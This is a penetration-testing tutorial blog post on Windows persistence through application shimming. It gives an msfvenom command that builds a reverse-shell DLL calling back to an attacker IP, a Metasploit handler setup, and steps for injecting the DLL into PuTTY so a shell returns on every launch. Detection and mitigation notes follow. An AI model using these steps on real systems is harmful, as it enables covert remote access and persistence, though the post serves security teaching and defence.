---
title: 'Windows Persistence using Application Shimming'
date: 2020-01-26T14:07:00+01:00
draft: false
---

In this article, we are going to describe the persistence of the Application Shimming and how vital it is in Windows Penetration Testing.

### **TL; DR**

Application Shimming is a technique preinstalled on Windows OS that can be used to make the applications developed for the earlier versions of Windows OS still work on the latest version of Windows

### **Table of Content**

*   **Introduction**
    *   What is Application Shimming?
    *   How does Application Shimming work?
*   **Configurations used in Practical**
*   **Persistence using Application Shimming**
    *   Malicious DLL Creation
    *   Injecting Malicious DLL
    *   Installing Infected Executable
    *   Gaining Persistent Shell
*   **Detection**
*   **Mitigation**
*   **Conclusion**

### **Introduction**

### **What is Application Shimming?**

Ever since the early stages of Microsoft Windows, there have been some fundamental features that have been part of the Windows basic Functionalities. One of them is their “Backward Compatibility”. What it means is that if your Software was developed earlier like at the time of Windows XP. But now we have Windows 10 and you are worried that if the Windows will able to run that piece of software as it has updated. Here, the Backward Compatibility comes into play. It gives us the ability to run the software on the Windows OS that was not developed on that particular OS.

The “Shim Infrastructure” or how they like to call it at the big house “Microsoft Windows Application Compatibility Infrastructure” helped its user get that backward compatibility. Now the thing to keep in mind is that during all those years of development, Windows kept its basic Architecture the same. They developed around the same framework that they started to work in the early nineties. This means that there are still some bits of code in the Windows 10 that has been there since the times of Windows 95.

### **How does Application Shimming Work?**

The Shim Infrastructure applies a method of Application Programming Interface (API) hooking. Explicitly, it forces the nature of linking to redirect API calls from Windows itself to alternative code – the shim itself. The Windows Portable Executable (PE) and Common Object Format (COFF) Specification includes several headers, and the data directories in this header provide a layer of indirection between the application and the linked file. Calls to external binary files take place through the Import Address Table (IAT). Consequently, a call into Windows looks like the image shown below to the system.

![](https://i1.wp.com/1.bp.blogspot.com/-MZ9QL1G76-I/Xi2KFr9qY5I/AAAAAAAAiXY/FChUtdlMMTM2euWZq3mT0UaUp324r4V7gCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

We can modify the address of the Windows function fixed in the import table, and then replace it with a pointer to a function into the alternate shim code, as shown in the image given below.

![](https://i1.wp.com/1.bp.blogspot.com/-IAS1tzJGKOM/Xi2KIbHU6GI/AAAAAAAAiX4/x4TpdjzgU5w5bpi5BV7fQygGh8_Bc3INwCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

This indirection happens statically linked .dll files when the application is loaded. You can also shim dynamically linked .dll files by hooking it with an API.

### **Configurations used in Practical**

**Attacker:**

**OS:** Kali Linux 2019.4

**Tools:** [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/), [Metasploit Framework](https://www.metasploit.com/)

**Target:**

**OS:** Windows 10 (Build 1909)

**Tools:** [Windows Assessment and Deployment Kit (Windows ADK)](https://docs.microsoft.com/it-it/windows-hardware/get-started/adk-install), [PuTTY.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

You can download the Tools by clicking on Their Name.

### **Persistence using Application Shimming**

Application Shimming can perform many functions but we will be focusing on gaining a persistence shell on the Target System for now. This practical was tested in a lab-controlled environment where we have the configurations set for minimum interference. The actual real-life scenario can differ.

### **Malicious DLL Creation**

To begin the exploitation, we decided to create a payload using the MSFVenom tool. We used the reverse\_tcp payload with the target to be Windows System and gaining a shell. We defined the LHOST for the IP Address for the Attacker Machine followed by the subsequent LPORT on which we will be receiving the session from the target machine. We created this payload in the form of a Dynamic Link Library or DLL and named it inject.dll

```
msfvenom -p windows/shell/reverse\_tcp lport=9999 lhost=192.168.1.2 -f dll > inject.dll
```

![](https://i1.wp.com/1.bp.blogspot.com/-vNmm_yiCgX0/Xi2KI9UkIJI/AAAAAAAAiX8/bjJ4S8cUJn00V2OXZh73udLjMm4ACfp5wCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

As discussed in the Configurations used section we need the Windows Assessment and Deployment Kit. After downloading and installing it, we have service inside it. Its called Compatibility Administrator. We are going to need it to proceed further.

Now in our Attacker Machine, we transferred the recently created DLL to the Target Machine. We use the python one-liner for it. There are lots of ways this can be done. We start a Multi/Handler on the Attacker Machine with the proper configuration to receive the session that will be generated soon.

```
python -SimpleHTTPServer 80  
msfconsole  
use multi/handler  
set payload windows/shell/reverse\_tcp  
set lhost 192.168.1.2  
set lport 9999  
run
```

### **Injecting Malicious DLL**

Now we will divert our attention to the Target Machine. After browsing the IP Address of the Attacker Machine and downloading the Malicious DLL file, we open the Compatibility Administrator as shown in the image given below. Here we are using the 32-bit version as it is easier to bind the DLL to it. We also created a new custom Database.

![](https://i2.wp.com/1.bp.blogspot.com/-LZNGbpa5OxY/Xi2KJHDkaSI/AAAAAAAAiYA/OfXcBM2sXE0U5UpE0r6mEtURaxHxOV8JwCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Now we begin the process of binding the safe and original Executable without malicious DLL file. We right-clicked on our newly created Database and choose the First option in the Dropdown Menu called Create New. This leads to opening a sub-drop-down menu. We choose the Application Fix option as shown in the image given below. We can also use the Shortcut by pressing the Ctrl key and P key simultaneously.

![](https://i0.wp.com/1.bp.blogspot.com/-5gC6EH0Yd64/Xi2KJUy_RmI/AAAAAAAAiYE/h3HS5p8fAHstG4ki6XKBPtTTxEgh9nWJACLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

As soon as we click on that Application Fix option, we have ourselves a Config Window Titled “Create New Application Fix”. We enter the name of the Program to be fixed as “putty”. And we provide the path of the executable to the program we want to inject our malicious DLL into. In this case, we provide the path of the PuTTY.exe and hit Next.

![](https://i0.wp.com/1.bp.blogspot.com/-uBpcEWYW8D0/Xi2KJufQ4jI/AAAAAAAAiYI/1ysNgZDzL9wgV6jeZoKiI955QcAXoIL8ACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Now we are asked the compatibility modes. This would have been important if we were fixing a genuine executable. Or using the Shimming for genuine purposes. As we are not doing any of that, we will skip this step and straight-up hit the “Next” button and move on.

![](https://i1.wp.com/1.bp.blogspot.com/-RgUYAqOAMXw/Xi2KKFfHttI/AAAAAAAAiYM/Eix5dhStPA0zU6FR0PLJLdbUBJ9KkAO8gCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Now we are at an important step. We are asked the compatibility fix that we want to apply to the executable. We choose the “InjectDll” option from the list as shown in the image given below. After checking the box we hit the “Parameters” button to provide the path of out malicious DLL that we created at the start of the exploitation.

![](https://i1.wp.com/1.bp.blogspot.com/-Md89FD2jHfo/Xi2KKc-E2KI/AAAAAAAAiYQ/9qy2B7Qe-gAdZf_O4MgTkSWEpFEDak5QQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

This opens up a new small window asking the Command-Line. Here we provide the path of our malicious DLL and click OK button.

![](https://i1.wp.com/1.bp.blogspot.com/-C2Pq7XO1HvM/Xi2KKj-5uPI/AAAAAAAAiYU/9nfRGzNS0PobX3M1iaf_2b-wnBS7GHNSQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

Back to out config window, we click the Next Button and now we have the Matching Information panel in front of us. We click on “Unselect All” Button as we don’t want to add any more additional configurations to out payload. At last, we hit the Finish Button.

![](https://i2.wp.com/1.bp.blogspot.com/-PGA5Dt61FIM/Xi2KF4MO70I/AAAAAAAAiXc/XsLzoY3aw8ca1KOa8K5JQMW4TvwcfG79wCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

This closes the config window. We are back to our Compatibility Administrator window. We click the Save button as shown in the image below to inject our DLL in the PuTTY executable.

![](https://i2.wp.com/1.bp.blogspot.com/-D2FLyr9vhMo/Xi2KF5AiQkI/AAAAAAAAiXg/Sj4zURcbR1o4N0dhJnE2O8zqYlBtBpCYACLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

We are asked to name the database, we name it puttyshim. This can be whatever you want. In real life attacking situations choose the name that is less conspicuous.

![](https://i1.wp.com/1.bp.blogspot.com/-hldJJXXbHHk/Xi2KGytk78I/AAAAAAAAiXk/8UB2k2bLDtcfDne0YSPTWZU6VriHEUmcwCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

After naming the database we are asked the location, where we want to save the AppCompat Database or the .sdb file of the complete configuration.

![](https://i0.wp.com/1.bp.blogspot.com/-bJQ5geLfdO0/Xi2KHFbe2oI/AAAAAAAAiXo/HIfNo9vzJ9QfwtUXzy8_VWbW-j7qvHTBgCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

### **Installing Infected Executable**

Now that this is done, we will now install the now infected Executable on the Target Machine. This can be done by right-clicking on the name of the database and choosing the Install option from the drop-down button.

![](https://i0.wp.com/1.bp.blogspot.com/-LEL2A92EraM/Xi2KHXsbN6I/AAAAAAAAiXs/gdxcDvmbh9gVwY86eSEX4N8Y5giBgjF4QCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

This initiates an installation process that will installed our infected executable as a service. We can see that in the Programs and Features section inside the Control Panel as shown in the image below. If we had added the Publisher or Vendor Information at the earlier stage it would have appeared here.

![](https://i0.wp.com/1.bp.blogspot.com/-LEL2A92EraM/Xi2KHXsbN6I/AAAAAAAAiXs/gdxcDvmbh9gVwY86eSEX4N8Y5giBgjF4QCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

### **Gaining Persistent Shell**

Now when we execute the service that we just shimmed and installed. As soon as we have the program executed on the target machine, we will receive a shell on our attacker machine as shown in the image below. We can add the infected service in the startup service list to receive the shell every time the Target system reboots.

![](https://i1.wp.com/1.bp.blogspot.com/-bIE52MoM0Mo/Xi2KIH18uYI/AAAAAAAAiX0/Zn3ptfI0Zg0qdsFrzy9NqpC6pdumOTiYwCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

This concluded the exploitation. Now let’s talk defense mechanisms.

### **Detection**

There are many tools available that can detect the applications that have been shimmed.

*   **Shim-File-Scan****ner:** Scans Files/Folders for non-default shims and checks registry for installed shims
*   **Shim-****Process-Scanner:** Will search all process for shim flags and also check for the Shim App Helper

Other than that the process of shimming creates a bloody trail that leads right to the smoking gun aka the shimmed application. Shimming creates a trial inside the Registry at the following locations.

*   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom
*   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB

Apart from the registry, we have some locations on the Drives where we can find evidence for the Application Shimming.

*   C:\\Windows\\AppPatch\\Custom\\
*   C:\\Windows\\AppPatch\\Custom\\Custom64\\

We can also create custom Yara Rules and snort rules that could detect Application Shimming.

### **Mitigation**

As always, the first line of defense against any kind of attack is keeping our infrastructure and devices updated. Microsoft released this [patch](https://www.microsoft.com/en-us/download/details.aspx?id=46804) for restricting the Shim Application to bypass the UAC.

Some tools like the one in the Detection section can be used for mitigating the Applications Shimming.

Shim-Guard: Detects and alert on newly installed shims

We can also implement strict UAC policies to notify when a user is getting elevated privileges.

### **Conclusion**

This kind of attack is very much happening in real life. There have been multiple incidents targeted to different environments where the large scale compromise was done using the Applications Shimming.

Stay Tuned!

[MITRE|ATT&CK](https://attack.mitre.org/techniques/T1138/)

[Black Hat USA](https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf)

[FireEye](https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html)

**Author**: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact [**here**](https://www.linkedin.com/in/kavish-tyagi-844239125/)

The post [Windows Persistence using Application Shimming](https://www.hackingarticles.in/windows-persistence-using-application-shimming/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2tQxaLv